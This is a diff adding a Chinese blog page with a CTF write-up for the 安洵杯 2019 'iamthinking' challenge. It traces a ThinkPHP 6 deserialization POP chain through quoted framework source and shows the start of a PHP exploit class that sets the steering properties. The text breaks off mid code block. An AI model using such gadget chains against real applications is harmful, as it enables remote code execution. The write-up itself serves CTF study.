@@ -1,0 +1,651 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link href="https://fonts.proxy.ustclug.org/css2?family=Noto+Serif+SC&display=swap" rel="stylesheet">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/1avatar.png">
+  <link rel="icon" href="/img/bg/avatar1.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="D3n13d">
+  <meta name="keywords" content="Web,CTF,渗透测试">
+  
+    <meta name="description" content="安洵杯 2019-iamthinking TP6反序列化链子分析首先是利用链思路 123456789101112think\Model --&gt; __destruct()think\Model --&gt; save()think\Model --&gt; updateData()think\Model --&gt; db()后半部分利用链（同tp 5.2后半部分利用链)think\model">
+<meta property="og:type" content="article">
+<meta property="og:title" content="安洵杯 2019-iamthinking TP6反序列化链子分析">
+<meta property="og:url" content="https://d3n13d.github.io/2022/02/24/%E5%AE%89%E6%B4%B5%E6%9D%AF%202019-iamthinking-TP6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="D3n13d &#39;s blog">
+<meta property="og:description" content="安洵杯 2019-iamthinking TP6反序列化链子分析首先是利用链思路 123456789101112think\Model --&gt; __destruct()think\Model --&gt; save()think\Model --&gt; updateData()think\Model --&gt; db()后半部分利用链（同tp 5.2后半部分利用链)think\model">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202260040999.png">
+<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202252215505.png">
+<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202260124476.png">
+<meta property="article:published_time" content="2022-02-24T12:32:53.000Z">
+<meta property="article:modified_time" content="2022-02-25T17:27:31.687Z">
+<meta property="article:author" content="D3n13d">
+<meta property="article:tag" content="Web,CTF,渗透测试">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202260040999.png">
+  
+  
+  <title>安洵杯 2019-iamthinking TP6反序列化链子分析 - D3n13d &#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+  
+<link rel="stylesheet" href="/css/scroll.css">
+<link rel="stylesheet" href="/themes/hexo-theme-fluid/source/test.css">
+<link rel="stylesheet" href="/css/test.css">
+<link rel="stylesheet" href="/css/code.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"d3n13d.github.io","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":2,"color":"#29d","options":{"showSpinner":true,"trickleSpeed":80}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":1},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":21256305,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="D3n13d 's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>D3n13d &#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                时间线
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友人
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/bg/tree.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="安洵杯 2019-iamthinking TP6反序列化链子分析">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-author" aria-hidden="true"></i>
+      D3n13d
+    </span>
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-02-24 20:32" pubdate>
+        2022年2月24日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      12k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      46 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">安洵杯 2019-iamthinking TP6反序列化链子分析</h1>
+            
+            <div class="markdown-body">
+              <h1 id="安洵杯-2019-iamthinking-TP6反序列化链子分析"><a href="#安洵杯-2019-iamthinking-TP6反序列化链子分析" class="headerlink" title="安洵杯 2019-iamthinking TP6反序列化链子分析"></a>安洵杯 2019-iamthinking TP6反序列化链子分析</h1><p>首先是利用链思路</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><pre><code class="hljs pgsql">think\Model <span class="hljs-comment">--&gt; __destruct()</span><br>think\Model <span class="hljs-comment">--&gt; save()</span><br>think\Model <span class="hljs-comment">--&gt; updateData()</span><br>think\Model <span class="hljs-comment">--&gt; db()</span><br><br>后半部分利用链（同tp <span class="hljs-number">5.2</span>后半部分利用链)<br><br>think\model\concern\<span class="hljs-keyword">Conversion</span> <span class="hljs-comment">--&gt; __toString()</span><br>think\model\concern\<span class="hljs-keyword">Conversion</span> <span class="hljs-comment">--&gt; __toJson()</span><br>think\model\concern\<span class="hljs-keyword">Conversion</span> <span class="hljs-comment">--&gt; __toArray()</span><br>think\model\concern\<span class="hljs-keyword">Attribute</span> <span class="hljs-comment">--&gt; getAttr()</span><br>think\model\concern\<span class="hljs-keyword">Attribute</span> <span class="hljs-comment">--&gt; getValue()</span><br></code></pre></td></tr></table></figure>
+
+<p>这里分析也分两部分，以pop起点命名</p>
+<h2 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h2><p><code>安洵杯 2019]iamthinking\www\tp\vendor\topthink\think-orm\src\Model.php</code></p>
+<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202260040999.png" srcset="/img/loading.gif" lazyload alt="image-20220226004010902"></p>
+<p>​    来到了 Model.php 发现这里的 save方法可以利用，跟进一下save方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">save</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$data</span> = [], <span class="hljs-keyword">string</span> <span class="hljs-variable">$sequence</span> = <span class="hljs-literal">null</span></span>): <span class="hljs-title">bool</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">// 数据对象赋值</span><br>        <span class="hljs-keyword">$this</span>-&gt;setAttrs(<span class="hljs-variable">$data</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;isEmpty() || <span class="hljs-literal">false</span> === <span class="hljs-keyword">$this</span>-&gt;trigger(<span class="hljs-string">&#x27;BeforeWrite&#x27;</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-keyword">$this</span>-&gt;exists ? <span class="hljs-keyword">$this</span>-&gt;updateData() : <span class="hljs-keyword">$this</span>-&gt;insertData(<span class="hljs-variable">$sequence</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-literal">false</span> === <span class="hljs-variable">$result</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// 写入回调</span><br>        <span class="hljs-keyword">$this</span>-&gt;trigger(<span class="hljs-string">&#x27;AfterWrite&#x27;</span>);<br><br>        <span class="hljs-comment">// 重新记录原始数据</span><br>        <span class="hljs-keyword">$this</span>-&gt;origin   = <span class="hljs-keyword">$this</span>-&gt;data;<br>        <span class="hljs-keyword">$this</span>-&gt;set      = [];<br>        <span class="hljs-keyword">$this</span>-&gt;lazySave = <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>​    关注一下自定义函数，line 4的没什么好说的。重点看 line 8的语句 只要 <code>$this-&gt;exists=True</code> 就会执行 updateData()函数，反之则执行insertData</p>
+<p>​    这里选择走 updateData()这个函数。为什么不是 insertData？因为这个函数只实现了数据插入函数返回值也是布尔型没什么意义对于pop链挖掘来说。</p>
+<p>哦，差点忘了，为了走到line 8，我们需要满足 <code>$this-&gt;isEmpty()==True || false !== $this-&gt;trigger(&#39;BeforeWrite&#39;))</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isEmpty</span>(<span class="hljs-params"></span>): <span class="hljs-title">bool</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">empty</span>(<span class="hljs-keyword">$this</span>-&gt;data);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里让 $data 非空</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">trigger</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$event</span></span>): <span class="hljs-title">bool</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">$this</span>-&gt;withEvent) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br><br>        <span class="hljs-variable">$call</span> = <span class="hljs-string">&#x27;on&#x27;</span> . Str::studly(<span class="hljs-variable">$event</span>);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (method_exists(<span class="hljs-built_in">static</span>::class, <span class="hljs-variable">$call</span>)) &#123;<br>                <span class="hljs-variable">$result</span> = call_user_func([<span class="hljs-built_in">static</span>::class, <span class="hljs-variable">$call</span>], <span class="hljs-keyword">$this</span>);<br>            &#125; <span class="hljs-keyword">elseif</span> (is_object(<span class="hljs-built_in">self</span>::<span class="hljs-variable">$event</span>) &amp;&amp; method_exists(<span class="hljs-built_in">self</span>::<span class="hljs-variable">$event</span>, <span class="hljs-string">&#x27;trigger&#x27;</span>)) &#123;<br>                <span class="hljs-variable">$result</span> = <span class="hljs-built_in">self</span>::<span class="hljs-variable">$event</span>-&gt;trigger(<span class="hljs-built_in">static</span>::class . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$event</span>, <span class="hljs-keyword">$this</span>);<br>                <span class="hljs-variable">$result</span> = <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$result</span>) ? <span class="hljs-literal">true</span> : end(<span class="hljs-variable">$result</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$result</span> = <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span> === <span class="hljs-variable">$result</span> ? <span class="hljs-literal">false</span> : <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">catch</span> (ModelEventException <span class="hljs-variable">$e</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>为了 让 trigger函数返回 true 可以直接让 withEvent&#x3D;False</p>
+<p>然后再来到 updateData()这个函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">updateData</span>(<span class="hljs-params"></span>): <span class="hljs-title">bool</span></span><br><span class="hljs-function">   </span>&#123;<br>       <span class="hljs-comment">// 事件回调</span><br>       <span class="hljs-keyword">if</span> (<span class="hljs-literal">false</span> === <span class="hljs-keyword">$this</span>-&gt;trigger(<span class="hljs-string">&#x27;BeforeUpdate&#x27;</span>)) &#123;<br>           <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>       &#125;<br><br>       <span class="hljs-keyword">$this</span>-&gt;checkData();<br><br>       <span class="hljs-comment">// 获取有更新的数据</span><br>       <span class="hljs-variable">$data</span> = <span class="hljs-keyword">$this</span>-&gt;getChangedData();<br><br>       <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$data</span>)) &#123;<br>           <span class="hljs-comment">// 关联更新</span><br>           <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-keyword">$this</span>-&gt;relationWrite)) &#123;<br>               <span class="hljs-keyword">$this</span>-&gt;autoRelationUpdate();<br>           &#125;<br><br>           <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>       &#125;<br><br>       <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;autoWriteTimestamp &amp;&amp; <span class="hljs-keyword">$this</span>-&gt;updateTime &amp;&amp; !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$data</span>[<span class="hljs-keyword">$this</span>-&gt;updateTime])) &#123;<br>           <span class="hljs-comment">// 自动写入更新时间</span><br>           <span class="hljs-variable">$data</span>[<span class="hljs-keyword">$this</span>-&gt;updateTime]       = <span class="hljs-keyword">$this</span>-&gt;autoWriteTimestamp(<span class="hljs-keyword">$this</span>-&gt;updateTime);<br>           <span class="hljs-keyword">$this</span>-&gt;data[<span class="hljs-keyword">$this</span>-&gt;updateTime] = <span class="hljs-variable">$data</span>[<span class="hljs-keyword">$this</span>-&gt;updateTime];<br>       &#125;<br><br>       <span class="hljs-comment">// 检查允许字段</span><br>       <span class="hljs-variable">$allowFields</span> = <span class="hljs-keyword">$this</span>-&gt;checkAllowFields();<br><br>       <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;relationWrite <span class="hljs-keyword">as</span> <span class="hljs-variable">$name</span> =&gt; <span class="hljs-variable">$val</span>) &#123;<br>           <span class="hljs-keyword">if</span> (!is_array(<span class="hljs-variable">$val</span>)) &#123;<br>               <span class="hljs-keyword">continue</span>;<br>           &#125;<br><br>           <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$val</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>) &#123;<br>               <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$data</span>[<span class="hljs-variable">$key</span>])) &#123;<br>                   <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$data</span>[<span class="hljs-variable">$key</span>]);<br>               &#125;<br>           &#125;<br>       &#125;<br><br>       <span class="hljs-comment">// 模型更新</span><br>       <span class="hljs-variable">$db</span> = <span class="hljs-keyword">$this</span>-&gt;db();<br>       <span class="hljs-variable">$db</span>-&gt;startTrans();<br><br>       <span class="hljs-keyword">try</span> &#123;<br>           <span class="hljs-variable">$where</span>  = <span class="hljs-keyword">$this</span>-&gt;getWhere();<br>           <span class="hljs-variable">$result</span> = <span class="hljs-variable">$db</span>-&gt;where(<span class="hljs-variable">$where</span>)<br>               -&gt;strict(<span class="hljs-literal">false</span>)<br>               -&gt;field(<span class="hljs-variable">$allowFields</span>)<br>               -&gt;update(<span class="hljs-variable">$data</span>);<br><br>           <span class="hljs-keyword">$this</span>-&gt;checkResult(<span class="hljs-variable">$result</span>);<br><br>           <span class="hljs-comment">// 关联更新</span><br>           <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-keyword">$this</span>-&gt;relationWrite)) &#123;<br>               <span class="hljs-keyword">$this</span>-&gt;autoRelationUpdate();<br>           &#125;<br><br>           <span class="hljs-variable">$db</span>-&gt;commit();<br><br>           <span class="hljs-comment">// 更新回调</span><br>           <span class="hljs-keyword">$this</span>-&gt;trigger(<span class="hljs-string">&#x27;AfterUpdate&#x27;</span>);<br><br>           <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>       &#125; <span class="hljs-keyword">catch</span> (\<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>           <span class="hljs-variable">$db</span>-&gt;rollback();<br>           <span class="hljs-keyword">throw</span> <span class="hljs-variable">$e</span>;<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure>
+
+<p>我依旧选择了关注自定义的函数</p>
+<p>于是在跟进到 line 44时，我发现</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">db</span>(<span class="hljs-params"><span class="hljs-variable">$scope</span> = []</span>): <span class="hljs-title">Query</span></span><br><span class="hljs-function">  </span>&#123;<br>      <span class="hljs-comment">/** <span class="hljs-doctag">@var</span> Query $query */</span><br>      <span class="hljs-variable">$query</span> = <span class="hljs-built_in">self</span>::<span class="hljs-variable">$db</span>-&gt;connect(<span class="hljs-keyword">$this</span>-&gt;connection)<br>          -&gt;name(<span class="hljs-keyword">$this</span>-&gt;name . <span class="hljs-keyword">$this</span>-&gt;suffix)<br>          -&gt;pk(<span class="hljs-keyword">$this</span>-&gt;pk);<br></code></pre></td></tr></table></figure>
+
+<p>这里做了字符串拼接，也就会触发<code>__toString</code> 方法</p>
+<p>我们先写个简易的exp</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>;<br>	<span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Model</span></span>&#123;<br>        <br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$lazySave</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$withEvent</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$exists</span>;<br> <span class="hljs-comment">//   private $force;</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$table</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$obj</span> = <span class="hljs-string">&#x27;&#x27;</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;lazySave = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;withEvent = <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;exists = <span class="hljs-literal">true</span>;<br>      <span class="hljs-comment">//  $this-&gt;force = true;</span><br>        <span class="hljs-keyword">$this</span>-&gt;table = <span class="hljs-variable">$obj</span>;<br>    &#125;<br>	<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h2 id="toString-Thinkphp-5-2-rce链子"><a href="#toString-Thinkphp-5-2-rce链子" class="headerlink" title="__toString() Thinkphp 5.2 rce链子"></a>__toString() Thinkphp 5.2 rce链子</h2><p><code>安洵杯 2019]iamthinking\www\tp\vendor\topthink\think-orm\src\model\concern\Conversion.php</code></p>
+<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202252215505.png" srcset="/img/loading.gif" lazyload alt="image-20220225221522339"></p>
+<p>​    首先就是这个 <code>__toString()</code> 为什么是它，因为别的 <code>__toString()</code> 基本都是做的类型转换和字符串分割，不是预期的利用点。 跟进一下函数返回的toJson函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">toJson</span>(<span class="hljs-params"><span class="hljs-keyword">int</span> <span class="hljs-variable">$options</span> = JSON_UNESCAPED_UNICODE</span>): <span class="hljs-title">string</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> json_encode(<span class="hljs-keyword">$this</span>-&gt;toArray(), <span class="hljs-variable">$options</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>​    然后看这个 toJson $options虽然写死，但是前面还有toArray的返回值作为函数参数，继续跟进。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> 